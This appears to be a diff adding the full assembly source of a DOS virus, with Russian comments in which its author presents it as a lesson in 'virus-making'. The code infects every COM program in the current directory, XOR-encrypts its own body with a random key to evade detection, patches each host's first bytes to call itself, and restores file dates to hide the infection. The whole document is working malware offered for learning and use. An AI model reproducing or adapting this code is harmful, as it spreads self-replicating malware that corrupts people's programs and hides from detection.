@@ -1,0 +1,153 @@
+.model tiny
+.code
+org 100h
+;--------------------------------------
+;┌─────────────────────────────────────────────────────────────────────────────┐
+;│           Привет всем опять и опять из холодного города Иркутска!           │
+;│  Решил я продолжить славное дело обучения трудящихся делу вирмакинга и мой  │
+;│следующий урок - ШИФРОВАНЫЙ вирус! По устройству вирус идентичен ЕXAMPLE, так│
+;│что вам надо всего лишь разобраться в алгоритме шифрования (который простой  │
+;│как советская песня, так что обойдетесь без комментариев!                    │
+;│                                              CyberShadow...                 │
+;└─────────────────────────────────────────────────────────────────────────────┘
+; Осторожно, хоть эта прога и не резидентная она заражает сразу все СОМ проги
+; в текущей директории (с полным отсутсвием любых аттрибутов, что сделано
+; специально, хотя кто захочет, все равно переделает!)
+;--------------------------------------
+
+Const1 = offset FreeByte - offset Start
+Const2 = offset EndVirus - offset Start
+Const3 = offset EndVirus - offset Beg_crypt
+
+Begin:  call Start
+
+;--------------------------------------
+Start:  cld
+        pop DI
+        mov BP,3
+        sub DI,BP                    ;- DI=100h
+        push DI
+;      -------------------------------
+        mov SI,DS:[100h+1]           ;┐
+        add SI,103h                  ;│ SI=Begin addres
+        push SI                      ;┘
+	mov cx,const3
+	mov bx,offset beg_crypt-offset start
+	mov al,0
+cr_1:
+	xor cs:[si+bx],al
+	inc bx
+	loop cr_1
+beg_crypt:
+;      -------------------------------
+        add SI,Const1                ;┐
+        push SI                      ;│
+        movsw                        ;│ пеpеписали пpавильные
+        movsb                        ;┘    пеpвые 3 байта.
+;      --------------------------------
+        mov DX,SI                    ;┐
+        sub CX,CX                    ;│ нашли пеpвое имя файла.
+        mov AH,4eh                   ;│
+        int 21h                      ;│
+        pop SI DI                    ;┘
+;--------------------------------------
+Next:
+        cmp word ptr ds:[9ah],61000  ;┐ длина больше 61000 байт
+        jna no_exit                  ;┘ да-вываливаемся
+yes_exit:
+	jmp exit
+no_exit:
+        mov DX,80h+1eh               ;┐
+        mov AX,3d02h                 ;│ откpыли файл.
+        int 21h                      ;│
+        jc yes_exit                  ;│
+        mov BX,AX                    ;┘
+;      --------------------------------
+        mov DX,SI                    ;┐
+        mov CX,BP                    ;│ читаем пеpвые 3 байта
+        mov AH,3fh                   ;│
+        int 21h                      ;┘
+;      --------------------------------
+        cmp byte ptr ds:[si],0e8h    ;┐ проверимся на заражение (E8h-call)
+        je close_file                ;┘ да-вываливаемся
+        cmp word ptr ds:[si],'ZM'    ;┐ а не EXE-шник ли у нас?
+        je close_file                ;┘ да-вываливаемся
+        mov ax,5700h                 ;┐
+        int 21h                      ;│ сохранили время и дату файла
+        push dx                      ;│
+        push cx                      ;┘
+        mov AL,2                     ;┐
+        call Proc1                   ;│ пеpеместились
+        sub SI,BP                    ;│  на конец ф.
+        sub AX,BP                    ;│
+        mov [SI+1],AX                ;┘
+	push si di bx
+	mov si,di
+	mov di,64000
+	mov cx,const2
+	rep movsb
+cr_11:
+	in al,40h
+	or al,al
+	jz cr_11
+addr	equ offset cr_1-offset start-1
+	mov si,64000
+	mov byte ptr cs:[si+addr],al
+addr1	equ offset beg_crypt-offset start
+	mov bx,addr1
+	mov di,64000+addr1
+	mov cx,const1
+cr_2:
+	xor cs:[si+bx],al
+	inc bx
+	loop cr_2
+	mov dx,si
+	pop bx di si
+;      --------------------------------
+        mov CX,Const2                ;│
+        mov AH,40h                   ;│ записали тело вируса
+        int 21h                      ;┘
+;      --------------------------------
+        mov AL,0                     ;┐ пеpеместились
+        call Proc1                   ;┘ на начало файла
+;      --------------------------------
+        mov DX,SI                    ;┐
+        mov CX,BP                    ;│ поставили call на вирус
+        mov AH,40h                   ;│ в начале файла
+        int 21h                      ;┘
+;      --------------------------------
+        pop cx                       ;┐ восстановили время и дату
+        pop dx                       ;│
+        mov ax,5701h                 ;│
+        int 21h                      ;┘
+        add si,bp
+close_file:
+        sub si,bp
+        mov AH,3eh                   ;┐ закpыли файл
+        int 21h                      ;┘
+;      --------------------------------
+        add SI,BP                    ;┐
+        mov AH,4fh                   ;│
+        int 21h                      ;│ следующий файл
+        jc exit                      ;┘
+	jmp next
+;--------------------------------------
+exit:
+	ret
+        db 'Example by CyberShadow...' ; децильный копирайт
+;--------------------------------------
+Proc1:
+        sub DX,DX                    ;- Курсор в файл
+        sub CX,CX                    ;
+        mov AH,42h                   ;
+        int 21h                      ;
+        ret                          ;
+;--------------------------------------
+Jump:           call Begin           ;- это будет записано в начало проги
+FreeByte:       nop                  ;┐ а это место под первые 3 байта проги
+                nop                  ;│
+                ret                  ;┘
+Fname           db '*.com',0         ; маска файла
+EndVirus:                            ; GAME OVER!
+;--------------------------------------
+end begin
